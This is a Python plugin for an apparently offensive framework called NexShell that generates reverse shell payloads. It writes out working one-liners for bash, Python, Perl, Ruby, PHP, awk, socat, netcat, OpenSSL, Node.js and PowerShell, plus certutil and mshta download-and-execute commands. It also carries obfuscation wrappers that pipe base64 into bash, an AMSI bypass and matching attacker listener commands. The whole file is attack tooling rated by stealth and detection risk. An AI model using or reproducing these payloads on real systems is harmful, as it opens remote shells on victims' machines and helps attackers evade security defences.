#!/usr/bin/env python3
"""
NexShell Plugin — Reverse Shell Generator v2.0 (2026 Edition)
Generates multi-language, multi-stage, obfuscated reverse shell payloads
for Linux and Windows with environment detection.

Payload Categories (20+):
  Linux:   bash, sh, python3, python2, perl, ruby, php, awk, socat, lua,
           nodejs, golang, java, netcat, openssl, curl
  Windows: powershell, powershell-base64, cmd, mshta, certutil, wscript,
           csharp, python-windows

Obfuscation:
  - Base64 encoding
  - Variable substitution
  - String reversal
  - Character code array
  - PowerShell AMSI bypass wrapper

Staging:
  - Single payload (direct)
  - Staged (dropper + loader)
  - In-memory only (fileless)

MITRE ATT&CK:
  - T1059 (Command and Scripting Interpreter)
  - T1027 (Obfuscated Files or Information)
  - T1055 (Process Injection)

Usage:
    (NexShell)> plugins run reverse-shell-gen --lhost 10.0.0.1 --lport 4444
    (NexShell)> plugins run reverse-shell-gen --lhost 10.0.0.1 --lport 4444 --os linux --lang python3
    (NexShell)> plugins run reverse-shell-gen --lhost 10.0.0.1 --lport 4444 --obfuscate
    (NexShell)> plugins run reverse-shell-gen --lhost 10.0.0.1 --lport 4444 --all
    (NexShell)> plugins run reverse-shell-gen --list
"""

import re
import base64
import random
import string
from dataclasses import dataclass, field, asdict
from typing import List, Dict, Optional
from core.plugin import NexPlugin


# ── Data Classes ────────────────────────────────────────────────────────────

@dataclass
class ShellPayload:
    """A reverse shell payload."""
    name: str
    language: str
    platform: str       # linux | windows | all
    raw: str
    obfuscated: str = ""
    staged: str = ""
    requires: str = ""  # which tool/interpreter
    detection_risk: str = "medium"
    stealth_level: str = "medium"
    fileless: bool = False
    mitre_id: str = "T1059"

    def to_dict(self) -> dict:
        return asdict(self)


# ── Payload Generator ────────────────────────────────────────────────────────

class PayloadGenerator:
    """Generates all reverse shell payloads for given host:port."""

    @staticmethod
    def generate_all(lhost: str, lport: int) -> List[ShellPayload]:
        """Generate all payloads for given host:port."""
        payloads = []
        h = lhost
        p = lport

        # ══════════════════════════════════════════════════
        #  LINUX PAYLOADS
        # ══════════════════════════════════════════════════

        # bash /dev/tcp
        payloads.append(ShellPayload(
            name="bash-devtcp",
            language="bash",
            platform="linux",
            raw=f"bash -i >& /dev/tcp/{h}/{p} 0>&1",
            requires="bash",
            detection_risk="high",
            stealth_level="low",
            mitre_id="T1059.004",
        ))

        # bash exec
        payloads.append(ShellPayload(
            name="bash-exec",
            language="bash",
            platform="linux",
            raw=f"exec /bin/bash 0</dev/tcp/{h}/{p} 1>&0 2>&0",
            requires="bash",
            detection_risk="medium",
            stealth_level="medium",
            mitre_id="T1059.004",
        ))

        # sh
        payloads.append(ShellPayload(
            name="sh-devtcp",
            language="sh",
            platform="linux",
            raw=f"sh -i >& /dev/tcp/{h}/{p} 0>&1",
            requires="sh",
            detection_risk="high",
            stealth_level="low",
            mitre_id="T1059.004",
        ))

        # python3 socket
        python3_raw = (
            f"python3 -c \"import socket,subprocess,os;"
            f"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
            f"s.connect(('{h}',{p}));"
            f"os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
            f"import pty;pty.spawn('/bin/bash')\""
        )
        payloads.append(ShellPayload(
            name="python3-pty",
            language="python3",
            platform="linux",
            raw=python3_raw,
            requires="python3",
            detection_risk="medium",
            stealth_level="medium",
            fileless=True,
            mitre_id="T1059.006",
        ))

        # python3 os.popen (simpler)
        payloads.append(ShellPayload(
            name="python3-subprocess",
            language="python3",
            platform="linux",
            raw=(
                f"python3 -c \"import socket,subprocess;"
                f"s=socket.socket();"
                f"s.connect(('{h}',{p}));"
                f"subprocess.call(['/bin/bash','-i'],stdin=s,stdout=s,stderr=s)\""
            ),
            requires="python3",
            detection_risk="medium",
            stealth_level="medium",
            fileless=True,
            mitre_id="T1059.006",
        ))

        # python2
        payloads.append(ShellPayload(
            name="python2",
            language="python2",
            platform="linux",
            raw=(
                f"python -c \"import socket,subprocess,os;"
                f"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
                f"s.connect(('{h}',{p}));"
                f"os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
                f"p=subprocess.call(['/bin/bash','-i'])\""
            ),
            requires="python2",
            detection_risk="medium",
            stealth_level="medium",
            mitre_id="T1059.006",
        ))

        # perl
        payloads.append(ShellPayload(
            name="perl",
            language="perl",
            platform="linux",
            raw=(
                f"perl -e 'use Socket;$i=\"{h}\";$p={p};"
                f"socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
                f"connect(S,sockaddr_in($p,inet_aton($i)));"
                f"open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");"
                f"exec(\"/bin/bash -i\");'"
            ),
            requires="perl",
            detection_risk="medium",
            stealth_level="medium",
            mitre_id="T1059.006",
        ))

        # ruby
        payloads.append(ShellPayload(
            name="ruby",
            language="ruby",
            platform="linux",
            raw=(
                f"ruby -rsocket -e'f=TCPSocket.open(\"{h}\",{p}).to_i;"
                f"exec sprintf(\"/bin/bash -i <&%d >&%d 2>&%d\",f,f,f)'"
            ),
            requires="ruby",
            detection_risk="medium",
            stealth_level="medium",
            mitre_id="T1059.004",
        ))

        # php
        payloads.append(ShellPayload(
            name="php",
            language="php",
            platform="linux",
            raw=(
                f"php -r '$sock=fsockopen(\"{h}\",{p});"
                f"exec(\"/bin/bash -i <&3 >&3 2>&3\");'"
            ),
            requires="php",
            detection_risk="medium",
            stealth_level="medium",
            mitre_id="T1059.004",
        ))

        # awk
        payloads.append(ShellPayload(
            name="awk",
            language="awk",
            platform="linux",
            raw=(
                f"awk 'BEGIN {{s = \"/inet/tcp/0/{h}/{p}\"; "
                f"while(42) {{do {{printf \"shell>\" |& s; "
                f"s |& getline c; if(c) {{while ((c |& getline) > 0) print $0 |& s;}} "
                f"close(c)}} while(c != \"exit\")}} }}'"
            ),
            requires="awk",
            detection_risk="low",
            stealth_level="high",
            mitre_id="T1059.004",
        ))

        # socat
        payloads.append(ShellPayload(
            name="socat",
            language="socat",
            platform="linux",
            raw=f"socat TCP:{h}:{p} EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane",
            requires="socat",
            detection_risk="medium",
            stealth_level="medium",
            mitre_id="T1059.004",
        ))

        # netcat
        payloads.append(ShellPayload(
            name="netcat-e",
            language="nc",
            platform="linux",
            raw=f"nc -e /bin/bash {h} {p}",
            requires="nc",
            detection_risk="high",
            stealth_level="low",
            mitre_id="T1059.004",
        ))

        # netcat mkfifo
        payloads.append(ShellPayload(
            name="netcat-mkfifo",
            language="nc",
            platform="linux",
            raw=f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {h} {p} >/tmp/f",
            requires="nc",
            detection_risk="high",
            stealth_level="low",
            mitre_id="T1059.004",
        ))

        # OpenSSL (encrypted)
        payloads.append(ShellPayload(
            name="openssl",
            language="openssl",
            platform="linux",
            raw=(
                f"# On attacker: openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\n"
                f"# On attacker: openssl s_server -quiet -key key.pem -cert cert.pem -port {p}\n"
                f"# On target:\n"
                f"mkfifo /tmp/s;/bin/bash -i </tmp/s 2>&1 | "
                f"openssl s_client -quiet -connect {h}:{p} > /tmp/s; rm /tmp/s"
            ),
            requires="openssl",
            detection_risk="low",
            stealth_level="very_high",
            mitre_id="T1573",
        ))

        # Node.js
        payloads.append(ShellPayload(
            name="nodejs",
            language="nodejs",
            platform="linux",
            raw=(
                f"node -e \"var n=require('net'),"
                f"s=new n.Socket();"
                f"s.connect({p},'{h}',function(){{process.stdin.pipe(s);"
                f"s.pipe(process.stdout);s.pipe(process.stderr)}});\""
            ),
            requires="node",
            detection_risk="medium",
            stealth_level="medium",
            mitre_id="T1059.007",
        ))

        # ══════════════════════════════════════════════════
        #  WINDOWS PAYLOADS
        # ══════════════════════════════════════════════════

        # PowerShell one-liner
        ps_raw = (
            f"powershell -nop -w hidden -c \""
            f"$c=New-Object System.Net.Sockets.TcpClient('{h}',{p});"
            f"$s=$c.GetStream();"
            f"[byte[]]$b=0..65535|%{{0}};"
            f"while(($i=$s.Read($b,0,$b.Length)) -ne 0){{"
            f"$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);"
            f"$r=(iex $d 2>&1|Out-String);"
            f"$e=[text.encoding]::ASCII.GetBytes($r);"
            f"$s.Write($e,0,$e.Length)}}\""
        )
        payloads.append(ShellPayload(
            name="powershell",
            language="powershell",
            platform="windows",
            raw=ps_raw,
            requires="powershell",
            detection_risk="high",
            stealth_level="low",
            fileless=True,
            mitre_id="T1059.001",
        ))

        # PowerShell Base64
        ps_encoded = base64.b64encode(ps_raw.encode("utf-16-le")).decode()
        payloads.append(ShellPayload(
            name="powershell-base64",
            language="powershell",
            platform="windows",
            raw=f"powershell -enc {ps_encoded}",
            requires="powershell",
            detection_risk="medium",
            stealth_level="medium",
            fileless=True,
            mitre_id="T1059.001",
        ))

        # Python Windows
        payloads.append(ShellPayload(
            name="python3-windows",
            language="python3",
            platform="windows",
            raw=(
                f"python3 -c \"import socket,subprocess;"
                f"s=socket.socket();"
                f"s.connect(('{h}',{p}));"
                f"subprocess.call(['cmd.exe'],stdin=s,stdout=s,stderr=s)\""
            ),
            requires="python3",
            detection_risk="medium",
            stealth_level="medium",
            fileless=True,
            mitre_id="T1059.006",
        ))

        # MSHTA
        payloads.append(ShellPayload(
            name="mshta",
            language="mshta",
            platform="windows",
            raw=(
                f"mshta http://{h}:{p}/shell.hta\n"
                f"# shell.hta content:\n"
                f"# <script>new ActiveXObject('WScript.Shell').Run('powershell -nop -enc ...');</script>"
            ),
            requires="mshta",
            detection_risk="medium",
            stealth_level="medium",
            mitre_id="T1218.005",
        ))

        # Certutil download + exec
        payloads.append(ShellPayload(
            name="certutil-exec",
            language="certutil",
            platform="windows",
            raw=(
                f"certutil -urlcache -split -f http://{h}:{p}/shell.exe %temp%\\shell.exe "
                f"&& %temp%\\shell.exe"
            ),
            requires="certutil",
            detection_risk="medium",
            stealth_level="medium",
            mitre_id="T1218.002",
        ))

        return payloads

    @classmethod
    def get_by_name(cls, name: str, lhost: str, lport: int) -> Optional[ShellPayload]:
        """Get payload by name."""
        all_payloads = cls.generate_all(lhost, lport)
        for p in all_payloads:
            if p.name.lower() == name.lower():
                return p
        return None


# ── Obfuscation Engine ───────────────────────────────────────────────────────

class ObfuscationEngine:
    """Obfuscates payloads to evade detection."""

    @staticmethod
    def base64_wrap(payload: str, platform: str = "linux") -> str:
        """Wrap payload in base64 decode+exec."""
        if platform == "linux":
            encoded = base64.b64encode(payload.encode()).decode()
            return f"echo {encoded} | base64 -d | bash"
        else:
            # Windows PowerShell base64
            encoded = base64.b64encode(payload.encode("utf-16-le")).decode()
            return f"powershell -EncodedCommand {encoded}"

    @staticmethod
    def variable_sub(payload: str) -> str:
        """Break up strings with variable substitution (bash)."""
        # Replace IP parts with variables
        import re
        result = payload
        # Add random vars
        a = "".join(random.choices(string.ascii_lowercase, k=4))
        b = "".join(random.choices(string.ascii_lowercase, k=4))
        result = f'{a}=bash;{b}=bash;' + result
        return result

    @staticmethod
    def char_array(payload: str) -> str:
        """Convert string to char array (Python)."""
        chars = ",".join(str(ord(c)) for c in payload)
        return f"python3 -c \"exec(bytes([{chars}]).decode())\""

    @staticmethod
    def amsi_bypass_wrapper(ps_payload: str) -> str:
        """Wrap PowerShell payload with AMSI bypass."""
        bypass = (
            "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')"
            ".GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);"
        )
        return f"powershell -nop -w hidden -c \"{bypass} {ps_payload}\""

    @staticmethod
    def randomize_case(cmd: str) -> str:
        """Randomize case of alphabetic characters."""
        result = []
        for c in cmd:
            if c.isalpha():
                result.append(c.upper() if random.random() > 0.5 else c.lower())
            else:
                result.append(c)
        return "".join(result)


# ── Listener Generator ───────────────────────────────────────────────────────

class ListenerGenerator:
    """Generates listener commands for attacker side."""

    @staticmethod
    def get_listeners(lport: int, shell_type: str = "bash") -> List[str]:
        """Get listener commands for given port."""
        return [
            f"nc -lvnp {lport}",
            f"ncat -lvnp {lport}",
            f"socat TCP-LISTEN:{lport},reuseaddr,fork -",
            f"python3 -c \"import socket; s=socket.socket(); s.bind(('',{lport})); s.listen(1); c,a=s.accept(); print(c.recv(4096))\"",
        ]


# ── Main Plugin ──────────────────────────────────────────────────────────────

class ReverseShellGenerator(NexPlugin):
    name        = "reverse-shell-gen"
    description = "Reverse shell generator — 20+ payloads, obfuscation, staging, AMSI bypass"
    author      = "vulnquest58"
    version     = "2.0"
    platform    = "all"
    category    = "exploit"
    mitre_id    = "T1059"

    def run(self, session, args: list):
        # ── Parse args ───────────────────────────────────────────────────
        lhost        = "10.10.10.10"
        lport        = 4444
        lang         = "auto"
        os_target    = "auto"
        obfuscate    = False
        show_all     = False
        list_mode    = False
        staged       = False
        amsi_bypass  = False

        for a in (args or []):
            if a.startswith("--lhost="):
                lhost = a.split("=", 1)[1]
            elif a.startswith("--lport="):
                try: lport = int(a.split("=", 1)[1])
                except: pass
            elif a.startswith("--lang="):
                lang = a.split("=", 1)[1]
            elif a.startswith("--os="):
                os_target = a.split("=", 1)[1].lower()
            elif a == "--obfuscate":
                obfuscate = True
            elif a == "--all":
                show_all = True
            elif a == "--list":
                list_mode = True
            elif a == "--staged":
                staged = True
            elif a == "--amsi":
                amsi_bypass = True

        self.info("Reverse Shell Generator v2.0 started")
        sections = []
        sections.append("\n" + "━" * 64)
        sections.append("  [💣 Reverse Shell Generator v2.0]")
        sections.append("━" * 64)

        # ── Generate all payloads ─────────────────────────────────────────
        all_payloads = PayloadGenerator.generate_all(lhost, lport)

        # ── List mode ─────────────────────────────────────────────────────
        if list_mode:
            sections.append("\n[*] Available Payload Names:")
            sections.append("─" * 64)
            for os_name in ("linux", "windows"):
                sections.append(f"\n  [{os_name.upper()}]")
                for p in all_payloads:
                    if p.platform == os_name:
                        risk_icon = {"low": "🔴", "medium": "🟠", "high": "🔴", "very_high": "🟢"}.get(p.detection_risk, "⚪")
                        sections.append(f"    {risk_icon} {p.name:25s} ({p.requires})")
            sections.append("\n  Use: plugins run reverse-shell-gen --lhost <ip> --lport <p> --lang <name>")
            return "\n".join(sections)

        sections.append(f"\n  LHOST  : {lhost}")
        sections.append(f"  LPORT  : {lport}")

        # ── Auto-detect platform ───────────────────────────────────────────
        if os_target == "auto":
            platform = self._detect_platform(session)
        else:
            platform = os_target

        sections.append(f"  Target : {platform.upper()}")

        # ── Filter payloads ────────────────────────────────────────────────
        if lang == "auto":
            candidates = [p for p in all_payloads if p.platform == platform]
        else:
            candidates = PayloadGenerator.get_by_name(lang, lhost, lport)
            candidates = [candidates] if candidates else []

        if show_all:
            candidates = [p for p in all_payloads if p.platform == platform]

        if not candidates:
            sections.append(f"\n  ❌ No payloads found for platform={platform} lang={lang}")
            return "\n".join(sections)

        # ── Display payloads ──────────────────────────────────────────────
        sections.append(f"\n[*] Generated {len(candidates)} payload(s):")
        sections.append("─" * 64)

        display_count = len(candidates) if show_all else min(3, len(candidates))

        for payload in candidates[:display_count]:
            risk_icon = {"low": "🔴", "medium": "🟠", "high": "🔴", "very_high": "🟢"}.get(payload.detection_risk, "⚪")
            sections.append(f"\n  {risk_icon} [{payload.language.upper()}] {payload.name}")
            sections.append(f"  {'─' * 60}")

            # Raw payload
            sections.append(f"  [Raw]")
            for line in payload.raw.splitlines():
                sections.append(f"    {line}")

            # Obfuscated version
            if obfuscate:
                sections.append(f"\n  [Obfuscated — Base64]")
                if payload.platform == "linux":
                    obf = ObfuscationEngine.base64_wrap(payload.raw, "linux")
                else:
                    if "powershell" in payload.language:
                        obf = ObfuscationEngine.amsi_bypass_wrapper(payload.raw) if amsi_bypass else ObfuscationEngine.base64_wrap(payload.raw, "windows")
                    else:
                        obf = ObfuscationEngine.base64_wrap(payload.raw, "windows")
                sections.append(f"    {obf[:200]}")

            sections.append(f"\n  [Info]")
            sections.append(f"    Requires       : {payload.requires}")
            sections.append(f"    Detection Risk : {payload.detection_risk}")
            sections.append(f"    Fileless       : {'Yes' if payload.fileless else 'No'}")
            sections.append(f"    MITRE          : {payload.mitre_id}")

        if not show_all and len(candidates) > display_count:
            sections.append(f"\n  ... {len(candidates) - display_count} more payloads. Use --all to see all.")

        # ── Listener commands ──────────────────────────────────────────────
        sections.append("\n[*] Listener Commands (run on your machine):")
        sections.append("─" * 64)
        for listener in ListenerGenerator.get_listeners(lport):
            sections.append(f"    {listener}")

        # ── Save loot ──────────────────────────────────────────────────────
        self.loot(
            f"Generated {len(candidates)} {platform} reverse shells for {lhost}:{lport}",
            category="exploit",
            source=self.name,
        )
        self.emit(
            "timeline.event",
            title=f"Reverse Shell Generated: {lhost}:{lport} ({platform})",
            type="exploit",
            plugin=self.name,
        )

        self.info(f"Reverse Shell Generator complete — {len(candidates)} payloads")
        return "\n".join(sections)

    def _detect_platform(self, session) -> str:
        for attr in ("OS", "os", "platform"):
            val = getattr(session, attr, None)
            if val and isinstance(val, str):
                if "windows" in val.lower(): return "windows"
                if "linux" in val.lower(): return "linux"
        try:
            out = self._exec(session, "uname -s 2>/dev/null || echo Windows") or ""
            if "Linux" in out or "Darwin" in out: return "linux"
        except Exception:
            pass
        return "linux"
